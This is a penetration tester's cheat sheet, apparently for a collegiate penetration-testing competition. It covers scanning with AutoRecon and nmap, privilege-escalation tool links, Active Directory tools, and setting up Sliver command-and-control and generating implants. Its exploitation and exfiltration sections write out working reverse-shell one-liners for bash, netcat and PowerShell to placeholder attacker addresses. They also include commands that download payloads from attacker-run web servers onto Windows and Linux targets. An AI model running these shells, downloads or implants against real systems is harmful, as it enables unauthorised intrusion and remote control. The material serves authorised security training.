# CPTC Notes

# Scanning

## Autorecon

Go straight up ez mode with [Autorecon](https://github.com/Tib3rius/AutoRecon)

```bash
sudo apt install python3
sudo apt install python3-pip
sudo apt install seclists curl dnsrecon enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
sudo apt install python3-venv
python3 -m pip install --user pipx
python3 -m pipx ensurepath
source ~/.zshrc ## or .bashrc if old
pipx install git+https://github.com/Tib3rius/AutoRecon.git

## Run scans as sudo using one of the following
sudo env "PATH=$PATH" autorecon [OPTIONS]
sudo $(which autorecon) [OPTIONS]

## Example
sudo $(which autorecon) 10.10.10.10
```

## NMAP (fallback)

```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```

# Enumeration

## Yummy PEAS (Win/Nix)

[https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

# Exploitation

## Shellz

[Linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

[Windows](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows)

```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

- [LOLBAS (Windows)](https://lolbas-project.github.io/#)
- [GTFOBins (Linux)](https://gtfobins.github.io/)

## Active Directory

- [Impacket](https://github.com/fortra/impacket)
- [Netwrix Attacks + Remediation](https://www.netwrix.com/attack.html)
- [The OGs](https://adsecurity.org/)
- [AD_Miner](https://github.com/Mazars-Tech/AD_Miner)
- [LDAPWordlistHarvester](https://github.com/p0dalirius/LDAPWordlistHarvester)
- [NTDISSECTOR](https://github.com/synacktiv/ntdissector/)
- [Bloodhound](https://github.com/SpecterOps/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)

## Payloads

[ScareCrow](https://github.com/Tylous/ScareCrow)

### Generating PoC Payload

```bash
msfvenom -f c --arch x64 -p windows/x64/messagebox EXITFUNC=thread
```

### Execute Assembly (Seatbelt) (via Sliver implant)

```bash
## Use 'ps' before to get explorer PID, then use it host new calc.exe
execute-assembly --ppid 4272 --process calc.exe --loot --name seatbelt /tmp/ghostpack/Seatbelt.exe -group=All
## Do NOT use --in-process as you have a chance of losing the implant.
## Although, some experimentation can occur if there is a reliable way to revive the implant or a second one exists
## Since --amsi-bypass and --etw-bypass only works with --in-process
```

# Exfiltration

## Windows

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

## Linux

```bash
## Get shell from https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_backconnect.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
```

## Secrets Finding

[NoseyParker](https://github.com/praetorian-inc/noseyparker)

# Infra Stuff

```bash
## Ez webserver to host shells
python3 -m http.server 80
```

## Sliver

### Setup

Ensure `mingw`, `git`, and `metasploit` are installed

```python
sudo apt install git mingw-w64
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

Pull latest release from: https://github.com/BishopFox/sliver/releases

Run it. Create service if needed

```python
## Create two files
## /etc/systemd/system/sliver-server.service
[Unit]
Description=Sliver Server
[Service]
Type=simple
ExecStart=/usr/local/bin/sliver-server

## ~/.sliver/configs/server.json
{
    "daemon_mode": true,
    "daemon": {
        "host": "",
        "port": 31337
    },
    "logs": {
        "level": 5,
        "grpc_unary_payloads": true,
        "grpc_stream_payloads": true
    },
    "jobs": {}
}

sudo systemctl daemon-reload
sudo service sliver-server start
```

### Operation

Create new operators by logging into the server, sudo’ing to root, then running `./sliver-server`

```bash
./sliver-server new-operator -n name -l <server-ip>
```

Take the config that’s created and give it to the operator

Operator downloads release for their client:

[https://github.com/BishopFox/sliver/releases](https://github.com/BishopFox/sliver/releases) 

After downloading:

```bash
chmod +x sliver-client_linuxsudo
cp ./sliver-client_linux /usr/bin/sliver
sliver
## Should give an error about not having any configs set, such as:
## No config files found at /home/khronos/.sliver-client/configs (see --help)
## Use the file/filename that Justin sent. Name will change based on moniker
cp khronos_x.x.x.x.cfg /home/khronos/.sliver-client/configs/khronos_x.x.x.x.cfg
chmod 600 /home/khronos/.sliver-client/configs/khronos_x.x.x.x.cfg
## The above step is very important to reduce the risk of someone else reading the file
```

If all went well, you should be able to run the client and connect now

```bash
❯ sliver
Connecting to x.x.x.x:31337 ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain infect
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >
```

## Start Apache Web Server

```bash
sudo systemctl start apache2sudo chmod -R 777 /var/www/html
```

## Implants

### Stock Windows x64 Session Based

```bash
generate --mtls x.x.x.x --os windows --arch amd64 --format exe --save <location>
## If you want to serve it up on the sliver server, such as via Apache, then run:
scp -i <key> <payload-name> <name>@x.x.x.x:/var/www/html/
## ssh into the machine and then 
sudo chown www-data:www-data /var/www/html/<implant>
```

### Stock Windows x64 Beacon Based

### Generate Profile + Implant from Profile

```bash
## Session-based
profiles new --mtls x.x.x.x --os windows --arch amd64 --format exe session_win_default

## Beacon-based
profiles new beacon --mtls x.x.x.x --os windows --arch amd64 --format exe  --seconds 5 --jitter 3 beacon_win_default

## Generate from profile
profiles generate --save ~/ beacon_win_default
```

Great tutorial series, 1-12: [https://dominicbreuker.com/post/learning_sliver_c2_01_installation/](https://dominicbreuker.com/post/learning_sliver_c2_01_installation/)

Sliver C2 Wiki: [https://github.com/BishopFox/sliver/wiki](https://github.com/BishopFox/sliver/wiki)

Seatbelt: [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

# Resources

Holy Grail: [https://book.hacktricks.xyz/welcome/readme](https://book.hacktricks.xyz/welcome/readme)

ARTToolkit: [https://arttoolkit.github.io/](https://arttoolkit.github.io/) (Super handy because you can filter on “What you have”, “Services”, “Attack Type”, and “OS”)

Kubehound: [https://github.com/DataDog/KubeHound](https://github.com/DataDog/KubeHound)